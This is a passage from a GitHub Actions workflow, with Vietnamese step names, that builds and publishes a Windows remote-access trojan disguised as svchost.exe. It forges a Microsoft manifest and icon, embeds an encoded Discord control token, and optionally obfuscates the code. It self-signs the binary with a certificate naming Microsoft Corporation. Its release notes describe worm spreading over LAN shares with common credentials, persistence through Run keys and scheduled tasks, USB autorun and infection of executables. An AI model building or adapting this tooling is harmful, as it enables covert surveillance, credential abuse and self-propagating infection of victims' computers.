          <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
          <assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
            <assemblyIdentity type="win32" name="Microsoft.Windows.svchost" version="10.0.19041.1" processorArchitecture="amd64"/>
            <description>Host Process for Windows Services</description>
            <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
              <security>
                <requestedPrivileges>
                  <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
                </requestedPrivileges>
              </security>
            </trustInfo>
            <compatibility xmlns="urn:schemas-microsoft-com:compatibility.v1">
              <application>
                <supportedOS Id="{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}"/>
                <supportedOS Id="{1f676c76-80e1-4239-95bb-83d0f6d0da78}"/>
              </application>
            </compatibility>
          </assembly>
          '@
          [System.IO.File]::WriteAllText((Join-Path $PWD "svchost.manifest"), $mf)

      - name: Cài thư viện Python
        run: |
          python -m pip install --upgrade pip
          pip install "discord.py[voice]" PyNaCl psutil pyautogui pyperclip pynput mss opencv-python pillow numpy sounddevice soundfile soundcard requests pycryptodome pyarmor pyinstaller

      - name: Tạo icon giả Windows
        run: |
          python -m pip install pillow --quiet
          python -c "from PIL import Image, ImageDraw; S=256; img=Image.new('RGBA',(S,S),(0,0,0,0)); d=ImageDraw.Draw(img); b=(0,120,215,255); m=26; g=10; w=(S-2*m-g)//2; d.rectangle((m,m,m+w,m+w),fill=b); d.rectangle((m+w+g,m,S-m,m+w),fill=b); d.rectangle((m,m+w+g,m+w,S-m),fill=b); d.rectangle((m+w+g,m+w+g,S-m,S-m),fill=b); img.save('svchost.ico',sizes=[(256,256),(128,128),(64,64),(48,48),(32,32),(16,16)]); print('icon ok')"

      - name: Kiểm tra cú pháp
        run: |
          python -c "import ast; ast.parse(open('agent.py',encoding='utf-8').read()); print('OK: agent.py hop le')"

      - name: Tải libopus-0.dll
        shell: pwsh
        run: |
          $urls = @(
            "https://github.com/DSharpPlus/DSharpPlus/raw/master/docs/natives/vnext_natives_win32_x64.zip",
            "https://archive.mozilla.org/pub/opus/win64/opus-tools-0.2-opus-1.3-win64.zip",
            "https://archive.mozilla.org/pub/opus/win64/opus-tools-0.2-win64.zip"
          )
          $ok = $false
          foreach ($u in $urls) {
            try {
              Invoke-WebRequest -Uri $u -OutFile opus.zip -TimeoutSec 90 -ErrorAction Stop
              Remove-Item opus_tmp -Recurse -Force -ErrorAction SilentlyContinue
              Expand-Archive opus.zip -DestinationPath opus_tmp -Force
              $dll = Get-ChildItem -Path opus_tmp -Recurse -File | Where-Object { $_.Name -match '^(lib)?opus.*\.dll$' } | Select-Object -First 1
              if ($dll) { Copy-Item $dll.FullName "libopus-0.dll" -Force; $ok = $true; break }
            } catch { Write-Host "Thu $u that bai" }
          }
          if (-not $ok) { Write-Host "::warning::Khong tai duoc opus" }

      - name: Mã hóa token + cấu hình
        shell: pwsh
        env:
          BOT_TOKEN: ${{ github.event.inputs.token }}
          TOKEN_URL: ${{ github.event.inputs.token_url }}
          CTRL_CH: ${{ github.event.inputs.control_channel }}
          AKEY: ${{ github.event.inputs.agent_key }}
        run: |
          if ($env:BOT_TOKEN) { Write-Host "::add-mask::$env:BOT_TOKEN" }
          $inject = @'
          import os, re, base64, secrets
          s = open("agent.py", encoding="utf-8").read()

          def substr(pat, val):
              global s
              s = re.sub(pat, lambda m: m.group(0).split("=")[0].rstrip() + ' = "' + val + '"', s, count=1)

          tok = (os.environ.get("BOT_TOKEN") or "").strip()
          if tok:
              raw = tok.encode()
              key = secrets.token_bytes(16)
              enc = bytes(b ^ key[i % len(key)] for i, b in enumerate(raw))[::-1]
              substr(r'_TOK_ENC\s*=\s*".*?"', base64.b64encode(enc).decode())
              substr(r'_TOK_KEY\s*=\s*".*?"', base64.b64encode(key).decode())
              print("discord: CO token")
          else:
              substr(r'_TOK_ENC\s*=\s*".*?"', "")
              substr(r'_TOK_KEY\s*=\s*".*?"', "")
              print("discord: TAT (chi phat tan)")

          def pick(env):
              return (os.environ.get(env) or "").strip()

          for pat, env in ((r'TOKEN_URL\s*=\s*".*?"', "TOKEN_URL"),
                           (r'AGENT_KEY\s*=\s*".*?"', "AKEY")):
              v = pick(env)
              if v: substr(pat, v)

          ch = pick("CTRL_CH")
          if ch and ch != "0":
              s = re.sub(r'CONTROL_CH_ID\s*=\s*\d+',
                         lambda m: m.group(0).split("=")[0].rstrip() + " = " + ch, s, count=1)

          open("agent.py", "w", encoding="utf-8").write(s)

          print("--- CAU HINH DA NHUNG ---")
          for line in s.splitlines():
              if re.match(r'^\s*(CONTROL_CH_ID|TOKEN_URL|_TOK_ENC|_TOK_KEY)\s*=', line):
                  v = line.strip()
                  print("  " + (v[:80] + "..." if len(v) > 80 else v))
          '@
          $inject | python -

      - name: Xac nhan cau hinh trong agent.py
        shell: pwsh
        run: |
          Write-Host "=== dong cau hinh thuc te trong agent.py ==="
          Select-String -Path agent.py -Pattern '^\s*(CONTROL_CH_ID|TOKEN_URL|_TOK_ENC|_TOK_KEY)\s*=' |
            ForEach-Object { $_.Line.Trim() }

      - name: Register PyArmor license
        continue-on-error: true
        shell: pwsh
        env:
          PYARMOR_REGCODE: ${{ secrets.PYARMOR_REGCODE }}
        run: |
          if ($env:PYARMOR_REGCODE) {
            Set-Content -Path regcode.txt -Value $env:PYARMOR_REGCODE
            pyarmor reg -p "non-profits" regcode.txt
            pyarmor -v
          } else {
            Write-Host "Khong co PYARMOR_REGCODE - bo qua"
          }

      - name: Build exe
        shell: pwsh
        env:
          OBF: ${{ github.event.inputs.obfuscate }}
        run: |
          $extra = @()
          $src = "agent.py"
          $useObf = $false
          if ($env:OBF -eq "yes") {
            Remove-Item obf -Recurse -Force -ErrorAction SilentlyContinue
            try { pyarmor gen -O obf agent.py } catch {}
            if (Test-Path "obf/agent.py") {
              $rt = (Get-ChildItem -Path obf -Directory | Where-Object { $_.Name -like 'pyarmor_runtime*' } | Select-Object -First 1).Name
              if ($rt) {
                $src = "obf/agent.py"
                $extra += "--add-data"; $extra += "obf/$rt;$rt"
                $extra += "--hidden-import"; $extra += "$rt"
                $useObf = $true
              }
            }
            if ($useObf) { Write-Host "OK: build ban da obfuscate (PyArmor)" }
            else { Write-Host "::warning::PyArmor free khong obfuscate duoc script lon - build ban thuong" }
          }
          pyinstaller --noconfirm --clean --onefile --noconsole --noupx --optimize 2 --name svchost --icon svchost.ico --manifest svchost.manifest --version-file version_info.txt --add-binary "libopus-0.dll;." --collect-all soundcard --collect-all sounddevice --collect-all cv2 --hidden-import pynput.keyboard._win32 --hidden-import pynput.mouse._win32 --exclude-module tkinter --exclude-module matplotlib --exclude-module scipy --exclude-module pandas --exclude-module PyQt5 --exclude-module PySide2 --exclude-module IPython --exclude-module pytest @extra $src
          if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }

      - name: Ký số self-signed
        if: ${{ github.event.inputs.sign == 'yes' }}
        continue-on-error: true
        shell: pwsh
        run: |
          $cert = New-SelfSignedCertificate -Type CodeSigningCert -Subject "CN=Microsoft Windows, O=Microsoft Corporation" -CertStoreLocation Cert:\CurrentUser\My -NotAfter (Get-Date).AddYears(5)
          Set-AuthenticodeSignature -FilePath dist\svchost.exe -Certificate $cert -TimestampServer "http://timestamp.digicert.com"
          Write-Host "Da ky"

      - name: Chạy test trực tiếp
        if: ${{ github.event.inputs.run_minutes != '0' }}
        shell: pwsh
        env:
          RUN_MIN: ${{ github.event.inputs.run_minutes }}
        run: |
          $p = Start-Process -FilePath "dist\svchost.exe" -PassThru
          $secs = [int]$env:RUN_MIN * 60
          for ($i = 1; $i -le $secs; $i += 15) {
            if ($p.HasExited) { Write-Host "Thoat som!"; break }
            Start-Sleep -Seconds 15; Write-Host "[$i s]..."
          }
          if (-not $p.HasExited) { Stop-Process -Id $p.Id -Force }

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: svchost-exe
          path: dist/svchost.exe
          if-no-files-found: error

  release:
    needs: build
    if: ${{ github.event.inputs.make_release == 'yes' }}
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - name: Tải artifact
        uses: actions/download-artifact@v4
        with:
          name: svchost-exe
      - name: Tạo Release
        uses: softprops/action-gh-release@v2
        with:
          tag_name: build-${{ github.run_number }}
          name: svchost build ${{ github.run_number }}
          body: |
            Build #${{ github.run_number }} — Discord RAT + phát tán.

            4 đường phát tán:
            - `!lan` — quét LAN, copy qua `C$`/`ADMIN$`, thử 9 bộ cred phổ biến, đăng ký `HKLM\Run` + `schtasks` + chạy qua `wmic`
            - `!usb` — nhét `svchost.exe` + `autorun.inf` vào mọi ổ removable
            - `!infect <dir>` — nhiễm `.exe` (đổi gốc thành `.exe.bak`, đặt agent vào chỗ; chạy file đó sẽ chạy cả app gốc)
            - `!programs` — thả vào Program Files / ProgramData / Startup / %LOCALAPPDATA%\Programs

            `!spread` = làm hết. `!auto on|off` bật phát tán tự động (USB mỗi 3 phút, LAN mỗi 30 phút).
            `!spreadinfo` xem trạng thái. `!uninfect` khôi phục file gốc.
          files: |
            svchost.exe
          make_latest: true
